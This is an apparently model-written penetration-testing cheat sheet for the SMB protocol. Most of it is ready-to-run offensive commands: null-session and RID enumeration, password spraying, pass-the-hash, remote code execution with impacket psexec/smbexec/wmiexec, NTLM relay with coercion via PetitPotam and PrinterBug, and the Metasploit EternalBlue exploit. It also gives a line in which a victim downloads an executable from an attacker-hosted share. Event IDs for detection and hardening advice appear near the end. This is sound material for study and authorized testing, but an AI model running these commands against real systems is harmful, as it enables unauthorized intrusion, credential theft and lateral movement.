# SMB

#SMB #ServerMessageBlock #CIFS #Samba #filetransfer

## What is SMB?
Server Message Block — network file sharing protocol. Dominant in Windows environments. Also implemented as Samba on Linux/Unix. Used for file shares, printers, and IPC (named pipes for RPC/WMI).

- Port **TCP 445** — direct SMB (modern)
- Port **TCP 139** — SMB over NetBIOS (legacy)
- Port **UDP 137,138** — NetBIOS name/datagram services

---

## SMB Versions

| Version | Supported OS | Notes |
|---|---|---|
| CIFS | Windows NT 4.0 | Communication via NetBIOS interface |
| SMB 1.0 | Windows 2000 | Direct TCP; EternalBlue (MS17-010) target |
| SMB 2.0 | Vista / Server 2008 | Performance improvements, message signing |
| SMB 2.1 | Windows 7 / Server 2008 R2 | Locking mechanisms |
| SMB 3.0 | Windows 8 / Server 2012 | Multi-channel, end-to-end encryption |
| SMB 3.0.2 | Windows 8.1 / Server 2012 R2 | |
| SMB 3.1.1 | Windows 10 / Server 2016 | Integrity checking, AES-128 |

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/Lateral Movement/NetExec\|NetExec]] | The workhorse — enum shares/users/pol, spray, PtH, RID-brute, modules (`spider_plus`) |
| [[Tools/Lateral Movement/smbclient\|smbclient]] | Interactive share access, null-session listing, download/upload |
| [[Tools/Lateral Movement/smbmap\|smbmap]] | Share permission mapping + recursive listing/download |
| [[Tools/Lateral Movement/enum4linux\|enum4linux-ng]] | All-in-one SMB/RPC enumeration |
| [[Tools/Lateral Movement/RPCclient\|rpcclient]] | Null-session RPC enum (`enumdomusers`, `netshareenumall`) |
| [[Tools/Lateral Movement/impacket\|impacket]] | `psexec`/`smbexec`/`wmiexec`/`atexec` exec + PtH |
| [[Tools/Lateral Movement/ntlmrelayx\|ntlmrelayx]] | NTLM relay to SMB (signing off) |
| [[Tools/Lateral Movement/responder\|responder]] | Capture/poison NetNTLM for relay/cracking |
| [[Tools/File Transfer/SMBserver\|impacket-smbserver]] | Host a rogue share for payload delivery / hash capture |
| [[Tools/Scanning/NMAP\|NMAP]] | `smb-enum-*`, `smb-os-discovery`, `smb-vuln*` NSE |
| [[Tools/Payloads & Shells/metasploit\|metasploit]] | `ms17_010_eternalblue` and SMB aux/exploit modules |
| [[Tools/Auth/Hydra\|Hydra]] | Online brute (`smb://`) |

> [!warning] **CrackMapExec is deprecated — use NetExec (`nxc`).** CME is abandoned; NetExec is the maintained fork with the same syntax (`nxc smb ...`). Commands below use `nxc`; the old `crackmapexec`/`cme` binary still exists on some boxes but don't build new workflows on it.

---

## Enumeration

```bash
# Nmap SMB scripts
nmap -p 445 --script smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode -sV <target>
nmap -p 445 --script smb-vuln* <target>  # check for known vulnerabilities

# enum4linux-ng (comprehensive)
enum4linux-ng -A <target>
enum4linux-ng -A -C <target>  # with additional checks

# NetExec (nxc)
nxc smb <target>
nxc smb <target> -u '' -p '' --shares      # null session shares
nxc smb <target> -u guest -p '' --shares   # guest access
nxc smb <target> -u <user> -p <pass> --shares
nxc smb <target> -u <user> -p <pass> --users
nxc smb <target> -u <user> -p <pass> --groups
nxc smb <target> -u <user> -p <pass> --pass-pol

# RID cycling — enumerate domain users through a null/guest session even when --users is blocked
nxc smb <target> -u guest -p '' --rid-brute
nxc smb <target> -u '' -p '' --rid-brute 10000

# spider_plus — search shares for sensitive files
nxc smb <target> -u <user> -p <pass> -M spider_plus
nxc smb <target> -u <user> -p <pass> -M spider_plus -o READ_ONLY=false

# Find relay targets in one sweep — hosts with SMB signing NOT required
nxc smb <target>/24 --gen-relay-list relay_targets.txt

# smbmap
smbmap -H <target>                           # list shares (unauthenticated)
smbmap -H <target> -u <user> -p <pass>      # list shares (authenticated)
smbmap -H <target> -u <user> -p <pass> -R  # recursive listing
smbmap -H <target> -u <user> -p <pass> --download 'SHARE\path\file'

# rpcclient (null session)
rpcclient -U "" -N <target>
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> querydominfo
rpcclient $> netshareenumall
```

---

## Connect / Access

### Linux — smbclient

```bash
# List shares (null session)
smbclient -N -L //<target>
smbclient -L //<target> -U ''

# Connect to share (null/anonymous)
smbclient -N //<target>/sharename
smbclient //<target>/sharename -U ''

# Connect with credentials
smbclient //<target>/sharename -U user%Password123
smbclient //<target>/sharename -U domain/user%pass

# Download all files from share
smbclient //<target>/sharename -U user%pass -c 'recurse;prompt;mget *'

# smb: commands inside smbclient
smb: \> ls
smb: \> cd <dir>
smb: \> get <file>
smb: \> put <file>
smb: \> mget *
smb: \> mput *
```

### Windows — net use / PowerShell

```cmd
# Map share to drive letter
net use n: \\192.168.220.129\Finance
net use n: \\192.168.220.129\Finance /user:user Password123

# Count files
dir n: /a-d /s /b | find /c ":\"

# Search for keyword in filenames
dir n:\*cred* /s /b

# Search inside files
findstr /s /i cred n:\*.*
```

```powershell
# List share contents
Get-ChildItem \\192.168.220.129\Finance\

# Map share with credentials
$username = 'plaintext'
$password = 'Password123'
$secpassword = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred

# Count files
(Get-ChildItem -File -Recurse | Measure-Object).Count

# Search for cred files
Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
```

---

## Host a File Share (impacket-smbserver)

Useful for hosting payloads, receiving files from targets, or relaying hashes.

```bash
# Start anonymous SMB share (current directory)
sudo impacket-smbserver share ./ -smb2support

# Start with auth required
sudo impacket-smbserver share ./ -smb2support -user attacker -password Password123

# Target downloads from share
# Windows: copy \\<attacker>\share\file.exe .
# PowerShell: (New-Object Net.WebClient).DownloadFile('\\<attacker>\share\file.exe', 'C:\file.exe')

# Target uploads to share
# copy file.txt \\<attacker>\share\
```

---

## Attack Vectors

### Brute Force

```bash
nxc smb <target> -u users.txt -p passwords.txt --no-bruteforce
nxc smb <target> -u users.txt -p passwords.txt
hydra -L users.txt -P passwords.txt smb://<target>
```

### Pass-the-Hash (PTH)

```bash
# NetExec (nxc) PTH
nxc smb <target> -u <user> -H <NTLM_hash>
nxc smb <target>/24 -u <user> -H <NTLM_hash>  # sweep subnet

# smbclient PTH
smbclient //<target>/C$ -U user%hash --pw-nt-hash

# impacket PSExec
psexec.py <domain>/<user>@<target> -hashes :<NTLM>

# impacket smbexec / wmiexec
smbexec.py <domain>/<user>@<target> -hashes :<NTLM>
wmiexec.py <domain>/<user>@<target> -hashes :<NTLM>
```

### Remote Code Execution

```bash
# PsExec (requires admin share access)
psexec.py <user>:<pass>@<target>
psexec.py <domain>/<user>:<pass>@<target>

# smbexec (stealth — no binary dropped)
smbexec.py <user>:<pass>@<target>

# atexec (scheduled task)
atexec.py <user>:<pass>@<target> "whoami"
```

### NTLM Relay

```bash
# 1. Disable SMB and HTTP in Responder config first
sudo nano /etc/responder/Responder.conf
# Set SMB = Off, HTTP = Off

# 2. Start Responder to capture
sudo responder -I tun0

# 3. Start ntlmrelayx
sudo ntlmrelayx.py -tf targets.txt -smb2support
sudo ntlmrelayx.py -tf targets.txt -smb2support -i  # interactive shell
sudo ntlmrelayx.py -tf targets.txt -smb2support -c 'whoami'
```

> [!tip] **Coerce the auth instead of waiting for it.** Relay is far more reliable when you *force* a victim to authenticate: PetitPotam (`petitpotam.py <attacker> <target>`, MS-EFSRPC), the PrinterBug (`printerbug.py`/`dementor.py`, MS-RPRN), or `nxc smb <dc> -M coerce_plus` to find coercion surface. Point the coerced auth at `ntlmrelayx`, and relay to LDAP(S) for RBCD/shadow-cred escalation, not just SMB. Only signing-*not-required* targets (from `--gen-relay-list`) are valid SMB relay destinations.

### EternalBlue (MS17-010) — SMBv1

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target>
set LHOST <attacker>
run
```

---

## Detection & Artefacts

- **`psexec.py` is loud**: it creates a service (default random-named) and drops a binary in `ADMIN$` → Windows event **7045** (service install) + **4697**, plus **4624 type 3** logons. `smbexec`/`wmiexec` are quieter (no service binary) but `wmiexec` still spawns `wmiprvse.exe`→`cmd.exe`.
- **NTLM relay / coercion**: a flood of **4624/4625** from one source, or EFSRPC/RPRN calls (PetitPotam/PrinterBug) to a DC, are the coercion tells; relayed logons show the *attacker* IP with a victim account.
- **RID-brute / null-session enum** = many **4625**/anonymous logons enumerating SIDs.
- **Rogue `impacket-smbserver`** captures NetNTLMv2 when a victim browses to it — the artefact is an outbound SMB connection from the victim to an unexpected host.
- Defensive baseline: disable SMBv1, **require SMB signing** (kills relay), block outbound 445, enforce strong auth, restrict admin-share access, and turn off coercion surfaces (patch PetitPotam, disable Spooler on DCs).

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| SMBv1 enabled | EternalBlue and other critical vulns |
| Null session / guest access | Unauthenticated enumeration |
| No SMB signing | NTLM relay attacks |
| Admin shares accessible (C$, ADMIN$) | Lateral movement |
| Weak credentials | Brute force / spray |
| Writable shares | Malware placement |

---

## Quick Reference

| Goal | Command |
|---|---|
| List shares (unauthenticated) | `smbclient -N -L //host` |
| List shares (authenticated) | `smbmap -H host -u user -p pass` |
| Enum all | `enum4linux-ng -A host` |
| Connect to share | `smbclient //host/share -U user%pass` |
| PTH with nxc | `nxc smb host -u user -H hash` |
| PTH with psexec | `psexec.py domain/user@host -hashes :NTLM` |
| Brute force | `nxc smb host -u users.txt -p pass.txt` |
| Vuln check | `nmap -p 445 --script smb-vuln* host` |

---

> [!note] **See also** — Unix file-share siblings [[Services/File Xfer/NFS|NFS]] (the Linux equivalent; `no_root_squash`/UID-spoof privesc) and [[Services/File Xfer/Rsync|Rsync]] (daemon module read/write). Windows remote-exec/management siblings that share the RPC/DCOM transport: [[Services/Local System Management/RPC|RPC]], [[Services/Local System Management/WMI|WMI]], [[Services/Local System Management/WinRM|WinRM]]. Coerced/poisoned name resolution feeding relay comes from [[Services/Network management/DNS|DNS]] (ADIDNS WPAD/wildcard) + [[Tools/Lateral Movement/responder|responder]]; the same coerced auth relays to [[Services/Network management/LDAP|LDAP]] (RBCD/shadow creds) when SMB signing blocks the 445 target. Broadcast name-poisoning that captures the auth in the first place is [[Services/Network management/NetBIOS|NetBIOS]] (NBNS/LLMNR → responder).

---

*Created: 2026-07-13*
*Updated: 2026-09-23*
*Model: claude-opus-4-8*
